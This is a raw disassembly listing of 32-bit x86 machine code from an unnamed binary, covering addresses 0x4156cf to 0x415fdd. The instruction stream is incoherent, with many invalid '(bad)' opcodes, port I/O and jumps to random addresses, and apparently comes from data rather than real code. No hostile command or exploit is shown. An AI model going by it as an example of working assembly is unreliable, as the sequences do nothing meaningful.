  4156cf:	arpl   WORD PTR [ecx-0x61348cc8],sp
  4156d5:	dec    edx
  4156d6:	(bad)  
  4156d7:	bound  edi,QWORD PTR [edx+0x1c630417]
  4156dd:	test   DWORD PTR [eax+0x6a],ebp
  4156e0:	adc    DWORD PTR [ebx],ebx
  4156e2:	mov    esp,ebp
  4156e4:	sub    edi,esi
  4156e6:	jmp    DWORD PTR [esp+esi*4-0x7f]
  4156ea:	pop    ss
  4156eb:	addr16 push ds
  4156ed:	add    al,BYTE PTR [eax-0x16]
  4156f0:	enter  0x417,0x63
  4156f4:	push   ds
  4156f5:	mov    DWORD PTR [ebp+0x22273],eax
  4156fb:	call   0x634572a8
  415700:	push   ds
  415701:	mov    WORD PTR [edi],cs
  415703:	popa   
  415704:	in     al,dx
  415705:	cmp    ecx,eax
  415707:	fisttp DWORD PTR [esi+0x1]
  41570a:	mov    ?,WORD PTR [edi+0x2a]
  41570d:	add    al,BYTE PTR [eax]
  41570f:	mov    ss,WORD PTR [ebp-0x75]
  415712:	test   DWORD PTR [ebx+0x2a],esi
  415715:	add    al,BYTE PTR [eax]
  415717:	fiadd  DWORD PTR ds:0x5671c6f
  41571d:	jmp    0xf4a142e5
  415722:	(bad)  
  415723:	in     al,dx
  415724:	xor    BYTE PTR [edi-0x7e],bl
  415727:	push   esp
  415728:	or     ecx,ebp
  41572a:	add    ebp,eax
  41572c:	xchg   eax,esp
  41572e:	call   esp
  415730:	xor    BYTE PTR [edx+0x14],ah
	...
  41573f:	add    BYTE PTR [eax],al
  415741:	add    BYTE PTR [ecx+0x53],ah
  415744:	out    dx,al
  415745:	inc    ebp
  415746:	fcom   QWORD PTR ds:0x95889e8
  41574c:	jmp    0x624f8554
  415751:	sbb    DWORD PTR [ecx+ecx*1-0x17],0xe087da03
  415759:	call   FWORD PTR [eax+esi*1+0x11c68b28]
  415760:	in     eax,dx
  415761:	add    esp,DWORD PTR [ebx+0x7e]
  415764:	adc    bx,WORD PTR [edi+0x5]
  415768:	jmp    0xe54f3df9
  41576d:	add    esp,DWORD PTR [ebx+0x7b]
  415770:	loopne 0x415777
  415772:	call   0x9be4:0x8d8ca72f
  415779:	mov    esp,DWORD PTR [ebx+edx*8+0x71]
  41577d:	dec    ecx
  41577e:	cmp    al,0x4e
  415780:	je     0x4157ba
  415782:	dec    ebp
  415783:	jl     0x41572a
  415785:	test   BYTE PTR [ecx+ecx*1],ah
  415788:	mov    ecx,0x2c1d2e8c
  41578d:	aaa    
  41578e:	xor    eax,0xe1486130
  415793:	and    eax,0x3ed9d2ea
  415798:	push   eax
  415799:	js     0x4157b3
  41579b:	xor    BYTE PTR ds:0x5fd84,bh
  4157a1:	sahf   
  4157a2:	fild   WORD PTR [ecx-0x19]
  4157a5:	jne    0x4157a7
	...
  4157b3:	add    BYTE PTR [eax],al
  4157b5:	dec    esp
  4157b6:	das    
  4157b7:	inc    dh
  4157b9:	sbb    dl,cl
  4157bb:	shl    ecx,0x60
  4157be:	test   al,cl
  4157c0:	push   ss
  4157c1:	popa   
  4157c2:	jg     0x4157df
  4157c4:	in     eax,0x60
  4157c6:	add    eax,0xba69908d
  4157cb:	sbb    BYTE PTR [edx-0x1e],dh
  4157ce:	inc    DWORD PTR [ebx]
  4157d0:	jmp    0xd1c6d635
  4157d5:	les    ebp,FWORD PTR [edi]
  4157d7:	(bad)  
  4157d8:	sub    esi,ebp
  4157da:	popa   
  4157db:	sbb    esp,ebp
  4157dd:	pusha  
  4157de:	add    eax,0x9576f89
  4157e3:	add    cl,ch
  4157e5:	(bad)  [ecx+0x560ed17]
  4157eb:	mov    bl,cl
  4157ed:	bound  edx,QWORD PTR [ebx-0x3]
  4157f0:	stos   DWORD PTR es:[edi],eax
  4157f1:	(bad)  
  4157f3:	add    BYTE PTR [edi+0x6b],bl
  4157f6:	or     DWORD PTR [eax],eax
  4157f8:	jmp    0x67cc64b0
  4157fd:	dec    edi
  4157fe:	or     DWORD PTR [eax],eax
  415800:	jmp    0xe558e1e4
  415805:	pusha  
  415806:	add    eax,0xac57040
  41580b:	add    al,0xe9
  41580d:	pusha  
  41580e:	jl     0x415795
  415810:	(bad)  [edi+ebp*1-0x2]
  415814:	(bad)  
  415815:	lds    edx,FWORD PTR [esi]
  415817:	add    al,0xe9
	...
  415825:	add    BYTE PTR [eax],al
  415827:	add    BYTE PTR [eax+0x7b],ah
  41582a:	por    mm2,QWORD PTR [edx+0x5761c130]
  415831:	add    al,0x8e
  415833:	in     eax,dx
  415834:	and    al,0x2f
  415836:	inc    BYTE PTR [eax]
  415838:	fist   WORD PTR [ecx]
  41583a:	mov    eax,DWORD PTR [esi-0x1d0c6]
  415840:	sub    DWORD PTR [edi+0x2fa0416],0x40
  415847:	mov    DWORD PTR [ebp+ecx*1-0x7df5fffc],edx
  41584e:	test   BYTE PTR [eax],dl
  415850:	inc    BYTE PTR [edx]
  415852:	add    BYTE PTR [ebx+0x4117c],cl
  415858:	retf   0xe7c
  41585b:	add    bh,BYTE PTR [eax-0x9]
  41585e:	ror    BYTE PTR [eax+0x1c8e09aa],0xbe
  415865:	add    al,BYTE PTR [eax]
  415867:	jne    0x4158cc
  415869:	jp     0x4157ef
  41586b:	adc    BYTE PTR [esi+0x3c890002],bh
  415871:	or     al,BYTE PTR [eax+eax*1]
  415874:	mov    edx,0x86ae8742
  415879:	cs (bad) 
  41587b:	call   DWORD PTR [ebx]
  41587d:	mov    al,0xe
  41587f:	add    al,0x7a
  415881:	add    cl,BYTE PTR [ebx-0x1d14d7a]
  415887:	(bad)  
  415888:	mov    edx,0x8dff22
	...
  415899:	add    BYTE PTR [eax],al
  41589b:	jbe    0x4158cb
  41589d:	(bad)  
  41589e:	dec    DWORD PTR [edi+0x10]
  4158a1:	mov    eax,DWORD PTR [esi-0x1d196]
  4158a7:	shl    DWORD PTR [eax+0x24a0416],cl
  4158ad:	inc    eax
  4158ae:	mov    DWORD PTR [esi+edx*1-0x7ec5fffc],esp
  4158b5:	test   BYTE PTR [eax],dl
  4158b7:	dec    esi
  4158b8:	add    al,BYTE PTR [eax]
  4158ba:	mov    edi,DWORD PTR [edx+ecx*1+0x1c630004]
  4158c1:	push   edx
  4158c2:	pop    ds
  4158c3:	(bad)  
  4158c4:	into   
  4158c5:	push   ss
  4158c6:	add    al,0x63
  4158c8:	sbb    al,0xaf
  4158ca:	sbb    al,ch
  4158cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158cd:	adc    al,BYTE PTR [ebx+eiz*2]
  4158d0:	sbb    al,0x8b
  4158d2:	test   DWORD PTR [ebx+0x28],ebp
  4158d5:	add    al,BYTE PTR [eax]
  4158d7:	mov    ds:0x5f1b64b5,eax
  4158dc:	sbb    al,0x2
  4158de:	mov    ebp,esp
  4158e0:	sub    edi,esi
  4158e2:	jmp    esp
  4158e4:	mov    ds:0x1c67177c,al
  4158e9:	add    dl,al
  4158eb:	sbb    DWORD PTR ds:0x1c671b84,0x2
  4158f2:	jne    0x41595e
  4158f4:	mov    ds:0x1c670f7c,eax
  4158f9:	add    cl,BYTE PTR [ecx+0x3dd]
	...
  41590b:	add    BYTE PTR [eax],al
  41590d:	add    BYTE PTR [ebx-0x24],ah
  415910:	mov    ch,BYTE PTR [ebp+0x22847]
  415916:	jmp    0x871c:0x6304139d
  41591d:	mov    ch,0x6b
  41591f:	and    BYTE PTR [edx],al
  415921:	add    BYTE PTR [ebx-0x5ea329fb],dh
  415927:	xor    eax,DWORD PTR [edx]
  415929:	mov    ebx,DWORD PTR [edi]
  41592b:	dec    eax
  41592c:	(bad)  
  41592d:	push   ebp
  41592e:	adc    al,0xa3
  415930:	mov    bh,0x23
  415932:	push   ebx
  415933:	mov    ds:0x1ee33c32,eax
  415938:	add    al,BYTE PTR [eax]
  41593a:	ror    BYTE PTR [edx+0x7f],1
  41593d:	(bad)  
  41593e:	addr16 das 
  415940:	or     edi,DWORD PTR [ebx]
  415942:	fld    QWORD PTR [edx-0x2]
  415945:	(bad)  
  415946:	cmp    al,0x6
  415948:	(bad)  
  41594a:	sub    eax,0xe144014e
  41594f:	and    eax,0x45e1d4ee
  415954:	jecxz  0x41592b
  415956:	and    bh,dh
  415958:	call   0xe5233855
  41595d:	add    esp,DWORD PTR [ebx-0x4f]
  415960:	repz test BYTE PTR [ebp+eax*1+0x27003e9],0x6a
  415969:	and    eax,0xf6f82062
  41596e:	in     al,dx
  41596f:	add    ecx,ebp
  415971:	add    eax,DWORD PTR [eax]
	...
  41597f:	add    BYTE PTR [eax],al
  415981:	jno    0x415989
  415983:	sahf   
  415984:	neg    ah
  415986:	test   eax,0x65103e8
  41598b:	scas   al,BYTE PTR es:[edi]
  41598c:	inc    edx
  41598d:	(bad)  
  41598e:	std    
  41598f:	cdq    
  415990:	add    BYTE PTR [ecx+ecx*1],0x99
  415994:	sub    eax,DWORD PTR [esi+0xd34e52f]
  41599a:	sub    BYTE PTR [esi-0xbe26b78],0x39
  4159a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159a2:	sub    al,0x5b
  4159a4:	mov    edi,0xd521ff74
  4159a9:	ss inc edi
  4159ab:	lock add esi,DWORD PTR [ebx*1+0x2c8539e4]
  4159b3:	or     eax,0x4701bc81
  4159b8:	inc    edx
  4159b9:	pop    esp
  4159ba:	add    eax,0xe108893a
  4159bf:	loopne 0x41598f
  4159c1:	push   cs
  4159c2:	adc    BYTE PTR [edi-0x1322e180],0x3
  4159c9:	arpl   WORD PTR ds:0xfe70516,ax
  4159cf:	add    al,ch
  4159d1:	pusha  
  4159d2:	add    eax,0x2be07281
  4159d7:	(bad)  
  4159d8:	jmp    0xddc41ed0
  4159dd:	or     al,0x14
  4159df:	add    al,0xda
  4159e1:	sub    ah,BYTE PTR [esi+esi*1]
  4159e4:	push   edx
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [edi+0x2b],dl
  4159f6:	mov    dh,BYTE PTR [edi]
  4159f8:	dec    eax
  4159f9:	fdiv   st(2),st
  4159fb:	ds push edi
  4159fd:	jg     0x4159cc
  4159ff:	inc    ecx
  415a00:	dec    edx
  415a01:	cs (bad) 
  415a03:	cs jmp 0xf91:0xea0123c7
  415a0b:	in     eax,0x60
  415a0d:	add    eax,0x504228a
  415a12:	add    ah,BYTE PTR [eax]
  415a14:	bound  eax,QWORD PTR [esi+0x5e]
  415a17:	jno    0x415a7b
  415a19:	sub    al,0x85
  415a1b:	fxch   st(4)
  415a1d:	sub    edi,esi
  415a1f:	pusha  
  415a20:	out    dx,al
  415a21:	out    0x3,eax
  415a23:	jmp    0x429e2588
  415a28:	sbb    eax,0x206a0004
  415a2d:	sub    eax,DWORD PTR [eax]
  415a2f:	xchg   edi,eax
  415a30:	push   ebx
  415a31:	add    DWORD PTR [eax],eax
  415a33:	jmp    0x3c49f51b
  415a38:	data16 add BYTE PTR [ebp+0x564d9],0x60
  415a40:	fst    DWORD PTR [ebx]
  415a42:	add    al,0xe9
  415a44:	pusha  
  415a45:	lds    ecx,FWORD PTR [eax+0x15357]
  415a4b:	jmp    0xed50dc3f
  415a50:	pusha  
  415a51:	add    eax,0x16f678b
	...
  415a66:	add    BYTE PTR [edx-0x57],cl
  415a69:	push   es
  415a6a:	add    dl,BYTE PTR [ebx]
  415a6c:	clc    
  415a6d:	mov    edi,0xbe024288
  415a72:	sbb    al,0x46
  415a74:	pop    es
  415a75:	add    BYTE PTR [ebp+0x63],dh
  415a78:	stos   BYTE PTR es:[edi],al
  415a79:	test   BYTE PTR [eax],dl
  415a7b:	inc    esi
  415a7c:	pop    es
  415a7d:	add    BYTE PTR [ecx+0x3f9b4],cl
  415a83:	or     al,BYTE PTR [edi-0x79]
  415a86:	scas   al,BYTE PTR es:[edi]
  415a87:	inc    BYTE PTR [edx]
  415a89:	add    BYTE PTR [eax],al
  415a8b:	xchg   ebx,eax
  415a8c:	jg     0x415a9c
  415a8e:	add    al,0xfa
  415a90:	push   es
  415a91:	mov    eax,DWORD PTR [esi+0x312]
  415a97:	cmp    ah,BYTE PTR [ecx]
  415a99:	mov    ebx,edx
  415a9b:	cmp    ecx,DWORD PTR [ebx]
  415a9d:	pop    es
  415a9e:	cmp    DWORD PTR [eax],0x3
  415aa1:	push   edx
  415aa2:	mov    edi,DWORD PTR [ecx+ecx*1-0x38]
  415aa6:	cli    
  415aa7:	pop    ebp
  415aa8:	test   BYTE PTR [ecx+0x2aa86],0x0
  415aaf:	inc    edx
  415ab0:	stc    
  415ab1:	mov    bh,0x1
  415ab3:	retf   0x6
  415ab6:	add    DWORD PTR [esi+edx*1+0x4],eax
  415aba:	add    BYTE PTR [edx-0x49db6357],bh
  415ac0:	push   es
  415ac1:	add    BYTE PTR [ecx-0x1794f],al
  415ac7:	mov    dh,BYTE PTR [ebx+0x16]
  415aca:	add    DWORD PTR [eax],0x0
	...
  415ad9:	add    BYTE PTR [esi],bl
  415adb:	sbb    eax,0x6a010216
  415ae0:	and    bl,BYTE PTR [eax]
  415ae2:	pop    ebx
  415ae3:	stos   BYTE PTR es:[edi],al
  415ae4:	int3   
  415ae5:	call   0x3f32df
  415aea:	sub    eax,0x635b5b57
  415aef:	pop    esi
  415af0:	cli    
  415af1:	jmp    ebx
  415af3:	xchg   esi,eax
  415af4:	add    al,BYTE PTR ds:0x3b41c63
  415afa:	jp     0x415adc
  415afc:	out    0x17,eax
  415afe:	loop   0x415ab6
  415b00:	add    bh,BYTE PTR [ebp+0x63]
  415b03:	sbb    al,0xb4
  415b05:	add    ecx,DWORD PTR [edx-0x27e819a8]
  415b0b:	push   edi
  415b0c:	out    0x17,al
  415b0e:	xchg   edx,eax
  415b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b10:	inc    eax
  415b11:	out    0x8f,eax
  415b13:	(bad)  
  415b14:	xor    esi,edi
  415b16:	mov    ah,0x62
  415b18:	iret   
  415b19:	pop    edx
  415b1a:	and    DWORD PTR [edx+eax*1],esi
  415b1d:	(bad)  
  415b1e:	fld    QWORD PTR [ebx]
  415b20:	or     BYTE PTR [eax],al
  415b22:	arpl   WORD PTR ds:0x9d630002,bx
  415b28:	sub    eax,0x21c637f
  415b2d:	jae    0x415ac9
  415b2f:	lahf   
  415b30:	scas   al,BYTE PTR es:[edi]
  415b31:	and    edi,DWORD PTR [ebx+0x20]
  415b34:	mov    ch,0x41
  415b36:	cwde   
  415b37:	mov    ds:0x1c6303e6,al
  415b3c:	mov    dh,0x39
	...
  415b4a:	add    BYTE PTR [eax],al
  415b4c:	add    BYTE PTR [ebx-0x4301d3db],bh
  415b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b53:	inc    eax
  415b54:	out    0x60,eax
  415b56:	es xor dh,bh
  415b59:	fcomp  DWORD PTR [ecx+0x1b]
  415b5c:	int3   
  415b5d:	stos   BYTE PTR es:[edi],al
  415b5e:	push   edx
  415b5f:	xor    BYTE PTR [ecx-0x74f3ffd9],cl
  415b65:	in     eax,0x4b
  415b67:	push   es
  415b68:	add    BYTE PTR [ebx-0x4a],ah
  415b6b:	push   esp
  415b6c:	and    esp,DWORD PTR [edx+0x1e]
  415b6f:	push   esp
  415b70:	add    DWORD PTR [ecx+0x74007bfa],esp
  415b76:	add    al,0x6f
  415b78:	adc    al,0x67
  415b7a:	add    eax,0xe0c67ae9
  415b7f:	in     al,dx
  415b80:	add    esp,DWORD PTR [ebx-0x39]
  415b83:	sub    ecx,ebp
  415b85:	and    bh,dh
  415b87:	call   0xe76a7910
  415b8c:	jno    0x415bf6
  415b8e:	add    ecx,ebp
  415b90:	add    ebp,esi
  415b92:	cwde   
  415b93:	fbstp  TBYTE PTR [esi+0x146e7c5b]
  415b99:	addr16 add eax,0xdde7ae9
  415b9f:	in     eax,dx
  415ba0:	add    esp,DWORD PTR [ebx-0x3b]
  415ba3:	pop    edi
  415ba4:	bound  edi,QWORD PTR [eax+0x1]
  415ba7:	jmp    0xd8c135af
  415bac:	pop    es
  415bad:	arpl   WORD PTR ds:0x8a62,ax
	...
  415bbf:	add    BYTE PTR [ecx+eax*1-0x17],dl
  415bc3:	add    ebp,ecx
  415bc5:	adc    eax,0x43ee55eb
  415bca:	jo     0x415be0
  415bcc:	bound  esp,QWORD PTR [edi-0xc]
  415bcf:	pop    es
  415bd0:	arpl   WORD PTR ds:0x7fe80a94,ax
  415bd6:	fadd   DWORD PTR [edi]
  415bd8:	arpl   WORD PTR ds:0x16c8a70,ax
  415bde:	jmp    0x3ebf7ee6
  415be3:	adc    BYTE PTR [edi+0x5],bl
  415be6:	jmp    0xe5574265
  415beb:	add    esp,DWORD PTR [ebx+0x7c]
  415bee:	outs   dx,BYTE PTR ds:[esi]
  415bef:	or     esp,DWORD PTR [edi+0x5]
  415bf2:	jmp    0x672dd04a
  415bf7:	out    0x60,eax
  415bf9:	add    eax,0x7c12b7e9
  415bfe:	jmp    FWORD PTR [ecx+0x6a072021]
  415c04:	and    BYTE PTR [ebx],al
  415c06:	push   eax
  415c07:	xchg   ecx,eax
  415c08:	retf   0xfe2d
  415c0b:	sahf   
  415c0c:	out    0x79,eax
  415c0e:	paddsw mm4,QWORD PTR [eax+0x5]
  415c12:	mov    al,dh
  415c14:	enter  0x5,0xe9
  415c18:	pusha  
  415c19:	push   es
  415c1a:	xchg   cl,bl
  415c1c:	pop    esp
  415c1d:	add    eax,0xe3d26000
  415c22:	add    ebp,ecx
	...
  415c30:	add    BYTE PTR [eax],al
  415c32:	add    BYTE PTR [eax-0x7a],ah
  415c35:	cli    
  415c36:	imul   esp,DWORD PTR [eax+0x5],0x8458da00
  415c3d:	imul   ecx,DWORD PTR ds:0xb58b036f,0xfffffffc
  415c44:	rsqrtps xmm6,XMMWORD PTR [edx-0x5e]
  415c48:	and    BYTE PTR [ebx+0x40],ah
  415c4b:	push   ebx
  415c4c:	daa    
  415c4d:	pop    esi
  415c4e:	xchg   edi,eax
  415c4f:	sub    eax,0x60e1c1cb
  415c54:	xchg   dl,bh
  415c56:	jmp    0x9b4161c0
  415c5b:	pop    esp
  415c5c:	fiadd  WORD PTR [ebx-0x33]
  415c5f:	push   0x5e9fa86
  415c64:	sub    dh,bh
  415c66:	jnp    0x415c51
  415c68:	fadd   QWORD PTR [ebx-0x3b]
  415c6b:	pop    eax
  415c6c:	jl     0x415cc1
  415c6e:	int    0x68
  415c70:	ror    DWORD PTR [edx-0x712a7e1],cl
  415c76:	out    0x7c,al
  415c78:	(bad)  
  415c79:	pop    ebp
  415c7a:	cmp    al,0x98
  415c7c:	inc    ebp
  415c7d:	pop    es
  415c7e:	jmp    0xe55cc3ea
  415c83:	pusha  
  415c84:	add    eax,0xaa830075
  415c89:	test   BYTE PTR [eax],dl
  415c8b:	jle    0x415c90
  415c8d:	add    BYTE PTR [ecx+0x3f90c],cl
  415c93:	mov    al,BYTE PTR [ebx-0x79]
  415c96:	scas   al,BYTE PTR es:[edi]
	...
  415ca3:	add    BYTE PTR [eax],al
  415ca5:	add    BYTE PTR [esi-0x3],ah
  415ca8:	(bad)  
  415ca9:	push   ebx
  415cab:	jle    0x415cbb
  415cad:	add    al,0x4a
  415caf:	add    ecx,DWORD PTR [ebx-0xad7a]
  415cb5:	(bad)  
  415cb6:	jmp    0xffff:0x26bdff21
  415cbd:	(bad)  
  415cbe:	aas    
  415cbf:	cli    
  415cc0:	mov    al,BYTE PTR [esi-0xe6]
  415cc6:	mov    bl,0x7f
  415cc8:	push   ss
  415cc9:	add    al,0x3a
  415ccb:	add    eax,DWORD PTR [eax-0x77]
  415cce:	in     al,0x15
  415cd0:	add    al,0x0
  415cd2:	or     ch,BYTE PTR [edx+0x2fe1084]
  415cd8:	add    BYTE PTR [ebx+0x3f97c],cl
  415cde:	or     dl,bl
  415ce0:	push   ds
  415ce1:	mov    ecx,esi
  415ce3:	push   ds
  415ce4:	push   ss
  415ce5:	push   edx
  415ce6:	jno    0x415ccf
  415ce8:	out    0xd4,al
  415cea:	inc    edx
  415ceb:	(bad)  
  415cec:	std    
  415ced:	pop    edi
  415cee:	adc    al,0x56
  415cf0:	pop    ecx
  415cf1:	ret    0x2c2
  415cf4:	mov    eax,DWORD PTR [esi+ebx*4-0x2]
  415cf8:	mov    WORD PTR [eax-0x7546],ss
  415cfe:	icebp  
  415cff:	xchg   ecx,eax
  415d00:	add    al,BYTE PTR [edx+ecx*8]
  415d03:	add    dh,BYTE PTR [esi+0x19]
  415d06:	xor    DWORD PTR [ecx+0x40a],ebp
	...
  415d18:	add    BYTE PTR [edx+0x63c13b02],bh
  415d1e:	(bad)  
  415d1f:	or     BYTE PTR [ebx],ch
  415d21:	mov    ds:0x3800065a,al
  415d26:	pop    ebp
  415d27:	pop    es
  415d28:	add    bl,bh
  415d2a:	sbb    al,0x2
  415d2c:	ret    0x1c67
  415d2f:	icebp  
  415d30:	mov    edi,0x830220a1
  415d35:	jg     0x415d63
  415d37:	rcl    DWORD PTR [eax+ebx*8-0x8],1
  415d3b:	out    0x1f,eax
  415d3d:	mov    ch,0x4b
  415d3f:	dec    ecx
  415d40:	mov    dl,BYTE PTR [edx-0x11]
  415d43:	jl     0x415da0
  415d45:	xchg   DWORD PTR [ebx+edi*2+0x5b],ecx
  415d49:	jg     0x415d6f
  415d4b:	jmp    0x415cfa
  415d4d:	imul   ebx,DWORD PTR [eax],0x2
  415d50:	add    BYTE PTR [ebx+ebx*4+0x61],ah
  415d54:	jmp    FWORD PTR [esp+ebx*1]
  415d57:	sbb    DWORD PTR [edx],ecx
  415d59:	(bad)  
  415d5a:	jg     0x415d42
  415d5c:	call   FWORD PTR [esp+ebx*1]
  415d5f:	add    cl,BYTE PTR [ebp-0x74fbff81]
  415d65:	in     eax,0x17
  415d67:	push   es
  415d68:	add    BYTE PTR [ebx-0x67],ah
  415d6b:	jp     0x415d6c
  415d6d:	test   BYTE PTR ds:0x6e2b3b02,bl
  415d73:	adc    eax,0x62fdd8b
  415d78:	add    BYTE PTR [ebx+0x23],ah
  415d7b:	inc    ebx
  415d7c:	jne    0x415d7e
	...
  415d8a:	add    BYTE PTR [eax],al
  415d8c:	addr16 inc ebx
  415d8e:	inc    ebx
  415d8f:	jmp    0x9463:0x4434368
  415d96:	add    eax,DWORD PTR [eax]
  415d98:	mov    eax,0xe8bff119
  415d9d:	popf   
  415d9e:	cli    
  415d9f:	add    esp,DWORD PTR [ebx+0x1c]
  415da2:	std    
  415da3:	mov    ch,0x52
  415da5:	add    eax,0x41b75f6
  415daa:	jb     0x415d84
  415dac:	test   BYTE PTR [eax],0x62
  415daf:	add    cl,ch
  415db1:	jns    0x415dc1
  415db3:	jnp    0x415e0d
  415db5:	jle    0x415e28
  415db7:	xchg   BYTE PTR [ecx+eax*1-0x17],bl
  415dbb:	add    ebp,DWORD PTR [edi+ebp*2-0x28]
  415dbf:	cld    
  415dc0:	scas   al,BYTE PTR es:[edi]
  415dc1:	(bad)  
  415dc2:	out    0x78,eax
  415dc4:	sbb    BYTE PTR [edi+0xce78ec],cl
  415dca:	in     eax,0x3
  415dcc:	arpl   WORD PTR [esi+0x71b82fc],cx
  415dd2:	jmp    0x7747c0da
  415dd7:	or     BYTE PTR [edi+0x5],bl
  415dda:	jmp    0xed4f4ae1
  415ddf:	add    esp,DWORD PTR [ebx-0x70]
  415de2:	data16 or BYTE PTR [edi+0x5],ah
  415de6:	jmp    0x6f327a63
  415deb:	add    BYTE PTR [edi+0x5],ah
  415dee:	jmp    0x415e75
	...
  415dff:	sbb    eax,DWORD PTR [esi]
  415e01:	rol    DWORD PTR [edx],0x63
  415e04:	fwait
  415e05:	in     eax,dx
  415e06:	mov    ebx,0x7ec8bdb
  415e0b:	arpl   WORD PTR ds:0x95c5df0,ax
  415e11:	jmp    0x92c8ba19
  415e16:	sub    al,0xe5
  415e18:	and    al,0x71
  415e1a:	enter  0xd580,0x52
  415e1e:	add    al,0x3c
  415e20:	push   es
  415e21:	jmp    0xeedd010e
  415e26:	jp     0x415e58
  415e28:	jmp    0x88ac76e5
  415e2d:	push   eax
  415e2f:	popa   
  415e30:	adc    al,0x86
  415e32:	and    esp,DWORD PTR [eax+0x5]
  415e35:	add    dh,dh
  415e37:	cs leave 
  415e39:	(bad)  
  415e3a:	in     eax,dx
  415e3b:	push   ss
  415e3c:	rol    DWORD PTR [eax],1
  415e3e:	bound  ebx,QWORD PTR [edx+ecx*4-0x73839dfd]
  415e45:	cmp    al,dl
  415e47:	xchg   DWORD PTR [eax+0x560e8b2],ecx
  415e4d:	mov    esp,DWORD PTR [edi-0x80]
  415e50:	or     BYTE PTR [eax],al
  415e52:	jmp    0xae506644
  415e57:	pushf  
  415e58:	call   0x249a4778
  415e5d:	(bad)  
  415e5e:	rcr    BYTE PTR [ebp+0x623996],cl
	...
  415e70:	add    BYTE PTR [eax],al
  415e72:	jg     0x415e53
  415e74:	cli    
  415e75:	std    
  415e76:	dec    esp
  415e77:	xchg   ecx,eax
  415e78:	xchg   cl,ch
  415e7a:	fadd   DWORD PTR [eax+eax*1]
  415e7d:	mov    dl,0xde
  415e7f:	pop    es
  415e80:	add    al,0xe9
  415e82:	pusha  
  415e83:	fwait
  415e84:	pop    ss
  415e85:	jb     0x415e65
  415e87:	(bad)  
  415e89:	jmp    0xe0393eee
  415e8e:	pop    esp
  415e8f:	lock test DWORD PTR [edx+0xc],0x9f68f7ef
  415e97:	and    al,0x66
  415e99:	call   0xfa428efe
  415e9e:	inc    edi
  415e9f:	pop    DWORD PTR ds:0x8c5bfc62
  415ea5:	in     eax,dx
  415ea6:	out    0xde,eax
  415ea8:	les    ebx,FWORD PTR [edx-0x32ac2268]
  415eae:	mov    ah,0x99
  415eb0:	add    esp,DWORD PTR [eax-0x4c]
  415eb3:	out    0x2b,eax
  415eb5:	add    BYTE PTR [ecx-0x277bf214],ah
  415ebb:	push   es
  415ebc:	add    BYTE PTR [eax],al
  415ebe:	aas    
  415ebf:	(bad)  
  415ec0:	(bad)  
  415ec1:	(bad)  
  415ec2:	mov    edx,0x51cd8b07
  415ec7:	loope  0x415e50
  415ec9:	dec    esp
  415eca:	data16 cmc 
  415ecc:	cmp    cl,BYTE PTR [esi+eiz*2+0x3d]
  415ed0:	or     eax,0xa7087
	...
  415ee5:	adc    DWORD PTR [ebp+0x22],ebx
  415ee8:	adc    al,dh
  415eea:	hlt    
  415eeb:	add    BYTE PTR [edx],bh
  415eed:	push   esi
  415eee:	push   ds
  415eef:	dec    BYTE PTR [edx-0x44eddab2]
  415ef5:	js     0x415efe
  415ef7:	add    BYTE PTR [eax],al
  415ef9:	jbe    0x415f18
  415efb:	cmp    DWORD PTR [esi-0x1dcda],ecx
  415f01:	sub    eax,0x3a00c886
  415f06:	pop    es
  415f07:	mov    edx,DWORD PTR [esi+eiz*1+0x17]
  415f0b:	cmp    edx,ebx
  415f0d:	cmp    DWORD PTR [edx],ebp
  415f0f:	mov    ecx,DWORD PTR [ebp+0x38]
  415f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f13:	out    0x2b,al
  415f15:	push   cs
  415f16:	inc    ebx
  415f17:	es mov al,dh
  415f1a:	sbb    eax,0x560b39fe
  415f1f:	add    al,0x43
  415f21:	mov    ebx,0x4872d833
  415f26:	mov    ds:0xa416244a,al
  415f2b:	push   0x24
  415f2d:	bound  esi,QWORD PTR [edx]
  415f2f:	fmul   DWORD PTR [edi]
  415f31:	xchg   al,ch
  415f33:	(bad)  
  415f34:	(bad)  
  415f35:	cli    
  415f36:	xor    ebx,DWORD PTR [edx+0x24]
  415f39:	ficom  DWORD PTR [ebp+eax*2+0x53]
  415f3d:	arpl   WORD PTR [ebp+0x7d],bx
  415f40:	int    0xbb
  415f42:	mov    esi,0x97c4fe2d
  415f47:	mov    bh,0x23
	...
  415f55:	add    BYTE PTR [eax],al
  415f57:	add    BYTE PTR [ebx-0x69],dl
  415f5a:	iret   
  415f5b:	and    ebx,DWORD PTR [ebx+0x7d]
  415f5e:	aam    0x8a
  415f60:	popf   
  415f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f62:	sbb    esp,edi
  415f64:	les    esp,FWORD PTR [esi]
  415f66:	sub    esi,edi
  415f68:	dec    eax
  415f69:	xor    al,0x7d
  415f6b:	dec    ebx
  415f6c:	aas    
  415f6d:	and    BYTE PTR ds:0x1803cbed,al
  415f73:	ret    
  415f74:	adc    eax,0xf8a1763
  415f79:	or     ah,bl
  415f7b:	sar    BYTE PTR [ecx+0x2e],0x7d
  415f7f:	shl    DWORD PTR [edx-0x5efcf6bc],0x2f
  415f86:	mov    esi,0x4a277323
  415f8b:	jne    0x415fea
  415f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8e:	mov    dh,0x23
  415f90:	imul   eax,DWORD PTR [edi+0x4fd53abc],0xfffffffe
  415f97:	(bad)  
  415f98:	cmp    al,0x19
  415f9a:	rcl    BYTE PTR [edx-0x6e],0xa7
  415f9e:	cmp    bh,ah
  415fa0:	rcl    BYTE PTR [esi+0x5fd8fe29],0xde
  415fa7:	psubsb mm6,QWORD PTR [ebx+0x143f437d]
  415fae:	aam    0x4f
  415fb0:	fadd   DWORD PTR [ecx]
  415fb2:	sbb    ecx,DWORD PTR [edi+0x9]
  415fb5:	retf   
  415fb6:	sub    DWORD PTR [edx-0x75c708d5],ecx
	...
  415fc8:	add    BYTE PTR [eax],al
  415fca:	add    BYTE PTR [edi-0x474823f0],al
  415fd0:	test   DWORD PTR [ecx+ebp*1-0x14],ebx
  415fd4:	add    al,0x10
  415fd6:	jle    0x415f82
  415fd8:	inc    ebx
  415fd9:	(bad)  
  415fdb:	pusha  
  415fdc:	dec    edi
  415fdd:	jmp    0xc512e920
